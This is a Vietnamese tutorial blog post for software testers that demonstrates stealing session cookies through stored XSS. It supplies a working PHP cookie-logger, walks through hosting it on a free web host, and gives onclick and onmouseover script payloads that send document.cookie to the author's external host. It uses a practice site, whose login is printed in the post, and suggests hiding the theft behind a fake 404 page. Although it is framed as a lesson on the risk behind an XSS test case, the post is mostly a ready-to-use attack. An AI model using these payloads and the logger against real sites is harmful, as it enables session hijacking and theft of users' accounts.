Thông thường khi tạo TC cho một textbox ta sẽ có một case để check lổ hổng bảo mật XSS như bên dưới:

1. Nhập đoạn test script sau vào textbox : <script>alert("xss error") </script>
2. Xác nhận rằng script sẽ không được thực thi, không xuất hiện alert pop-up với nội dung "xss error"

Đại khái nội dung TC là thế, dùng để kiểm tra lỗi bảo mật XSS , chúng ta có thể kết luận TC là Fail nếu đoạn script trên được thực thi, alert pop-up xuất hiện nhưng thực sự lổ hổng này nguy hiểm như thế nào, và cách khai thác lỗ hổng này để đánh cắp thông tin người dùng thì chúng ta chưa được biết hoặc chưa nắm rõ. OK, mình sẽ demo cách lợi dụng lỗi bảo mật XSS để đánh cắp cookie 


Đầu tiên đây là những gì chúng ta cần

# 1. Một code đánh cắp cookie:

Không phải DEV nên mình google, khá là nhiều khi bạn tìm với keyword “cookie stealer” , sau nhiều lần tìm kiếm và thử nghiệm thì mình tìm được 1 đoạn code viết bằng php chạy hiệu quả như bên dưới, lấy xài luôn nhé :D


```
<?php
    $cookie = $_GET["c"];
    $file = fopen('logs.txt', 'a');
    fwrite($file, $cookie . "\n\n");
    
?>
```

Copy vào notepad++ và save với extension php nhé ( ex: xssError.php ), ý nghĩa đoạn code trên chỉ là lấy cookie xong ghi vào file logs.txt thôi, tùy vào nội dung đoạn code mà mình có thể lấy được nhiều thông tin hơn như IP address, port number, user agent …. . À rồi, mình cần tạo thêm 1 file logs.txt nữa, để trống thôi không cần nội dung. 
# 2. Cần có một free Web hosting service
#  
 Web hosting service để chứa 2 file trên, nhớ là free thôi nhé , demo chơi thôi mà :v mình tìm hộ lun , các bạn sử dụng https://www.000webhost.com nhé, ngon + bổ + rẻ :D

Bạn có thể sign-up nhanh bằng acc gmail  , sign-up thành công ở Homepage sẽ có giao diện thế này :
![](https://images.viblo.asia/0495f758-e766-42ce-8765-ced3260fc96a.png)


Click vào Build Website nhé, tên web để trống cũng được, chọn pass thôi:
![](https://images.viblo.asia/8d3e85bb-62e1-4c57-8f96-d6940ee7d03b.png)

Nhấn Create sẽ đến màn hình này 
![](https://images.viblo.asia/6f0656bf-22eb-484a-9393-9c060fe34475.png)

Click vào Upload Own Website nhé, sau đó upload 2 files xssError.php và Logs.txt bạn chuẩn bị ở trên vào public_html folder như bên dưới, vậy là xong các bước chuẩn bị, bây giờ đi tìm nạn nhân thôi (go)
![](https://images.viblo.asia/c9c269ea-44fb-4c56-b126-e4fc0ea40c5f.png)

# 3. Nạn nhân để thực hành lổ hổng bảo mật XSS : http://www.techpanda.org/index.php

Account: admin@google.com / Password2010

Đây là trang được tạo ra để thực hành thử nghiệm XSS nhé. Sau khi đến Dashboard thì tạo record mới như bên dưới
  +  Click  Add New Contact
  +  Nhập đoạn script bên dưới vào ô First name

```
<a href=# onclick=\"document.location=\'https://imploratory-carload.000webhostapp.com/XSSError.php?c=\'+escape\(document.cookie\)\;\">XSSError</a>
```


Ngoài thao tác click thì ta có thể chèn script với thao tác onmouseover 

```
<a onmouseover=\"document.location=\'https://imploratory-carload.000webhostapp.com/XSSError.php?c=\'+escape\(document.cookie\)\;\">XSSError</a>
```


Với đoạn script trên thì chỉ cần người dùng di chuyển mouse đến đoạn text XSSError thì cũng có thể bị mất cookie rồi.


Ngoài ra còn nhiều kiểu để chèn script đánh cắp cookie nữa mình sẽ bổ sung dần cho mọi người .

https://imploratory-carload.000webhostapp.com/XSSError.php << đây là link đường dẫn file XSSError.php mà mình upload ở phần 2, First name bây giờ sẽ hiển thị dưới dạng Hyperlink là XSSError , khi người dùng click vào thì sẽ chuyển đến trang php có đoạn code đánh cắp cookie ở trên, dĩ nhiên hiện tại mình chỉ demo đánh cắp cookie thôi nên nạn nhân sẽ thấy hiển thị 1 trang blank khá thô thiển :)) một số hacker có thể ngụy trang bằng cách hiển thị dưới dạng một đường link 404 - Page not found và một link di chuyển về Homepage để nạn nhân tiếp tục sử dụng mà không nghi ngờ mình đã bị đánh cắp cookie :D

![](https://images.viblo.asia/0d916ccc-04b9-46d0-a865-131290a35a64.png)

Theo happy path thì ta sẽ có một nạn nhân ngờ nghệch click vào hyperlink trên, đến file logs để thu hoạch thôi : https://imploratory-carload.000webhostapp.com/logs.txt 

Ta sẽ có được cookie là PHPSESSID của nạn nhân (len)

Mình sẽ bổ sung thêm phần sử dụng cookie đánh cắp ở trên để login account….. Hẹn phần sau sẽ rõ (bow)

Bài viết có tham khảo từ : https://www.guru99.com/how-to-hack-website.html